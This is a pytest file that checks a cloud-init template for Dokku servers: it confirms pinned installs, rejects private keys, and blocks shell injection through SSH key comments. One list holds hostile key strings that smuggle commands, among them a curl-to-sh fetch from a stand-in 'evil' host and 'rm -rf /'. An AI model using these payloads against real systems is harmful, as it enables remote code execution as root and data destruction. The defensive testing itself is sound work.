# tests/cloud/ship/test_cloudinit.py — the cloud-init user-data template renders
# a Dokku-ready box and never leaks private-key material.
#
# Covers SHIP-2 acceptance: pinned Dokku version, Docker install, nixpacks, and
# the PUBLIC key all present; a malformed/multi-line public key is rejected; no
# private-key material anywhere in the rendered output.

from __future__ import annotations

import pytest
from pocketpaw_ee.ship_engine.cloudinit import (
    DOKKU_VERSION,
    NIXPACKS_VERSION,
    render_user_data,
)

_PUBKEY = "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAITESTKEY paw-ship"


def test_renders_required_blocks():
    out = render_user_data(ssh_public_key=_PUBKEY)
    assert out.startswith("#cloud-config")
    # Docker install
    assert "get.docker.com" in out
    # Pinned Dokku bootstrap — the version is the pin, not "latest".
    assert f"install/v{DOKKU_VERSION}/bootstrap.sh" in out
    assert f"DOKKU_TAG=v{DOKKU_VERSION}" in out
    # nixpacks, pinned
    assert "nixpacks.com/install.sh" in out
    assert f"VERSION={NIXPACKS_VERSION}" in out
    # The public key authorized for root AND the dokku user.
    assert _PUBKEY in out
    assert "dokku ssh-keys:add admin" in out


def test_rejects_multiline_public_key():
    with pytest.raises(ValueError, match="single-line OpenSSH public key"):
        render_user_data(ssh_public_key="ssh-ed25519 AAAA...\nssh-ed25519 BBBB...")


def test_rejects_non_openssh_public_key():
    with pytest.raises(ValueError, match="single-line OpenSSH public key"):
        render_user_data(ssh_public_key="-----BEGIN OPENSSH PRIVATE KEY-----")


# ---------------------------------------------------------------------------
# Root command injection at first boot (fix/ship-review-p0)
# ---------------------------------------------------------------------------

# The key is interpolated inside single quotes into two ROOT-level runcmd
# entries. The old validator accepted anything non-empty, newline-free and
# ssh-/ecdsa-/sk-prefixed, so a quote in the comment closed the quoting and
# everything after it ran as root while the box was booting.
_INJECTION_KEYS = [
    "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5 paw-ship-a'; curl -s http://evil/x | sh; echo '",
    'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5 paw"; reboot; "',
    "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5 paw$(id)",
    "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5 paw`id`",
    "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5 paw; rm -rf /",
]


@pytest.mark.parametrize("hostile", _INJECTION_KEYS)
def test_rejects_a_key_whose_comment_carries_shell_syntax(hostile: str):
    """Shape validation — a hostile comment never reaches a command string."""
    with pytest.raises(ValueError, match="single-line OpenSSH public key"):
        render_user_data(ssh_public_key=hostile)


def test_the_key_is_shell_quoted_in_both_runcmd_entries():
    """Defence in depth: even a valid key travels quoted, not bare.

    Shape validation alone would be a single point of failure; the two
    ``echo <key>`` commands must not depend on it.
    """
    out = render_user_data(ssh_public_key=_PUBKEY)
    assert f"echo '{_PUBKEY}'" in out, "authorized_keys write is not shell-quoted"
    assert f"echo '{_PUBKEY}' | dokku ssh-keys:add admin" in out


def test_no_private_key_material_in_output():
    # A PRIVATE key body must never appear — the template only ever gets the
    # public half, but assert the guard so a future edit that passes the wrong
    # value is caught.
    out = render_user_data(ssh_public_key=_PUBKEY)
    assert "PRIVATE KEY" not in out
    assert "BEGIN OPENSSH" not in out
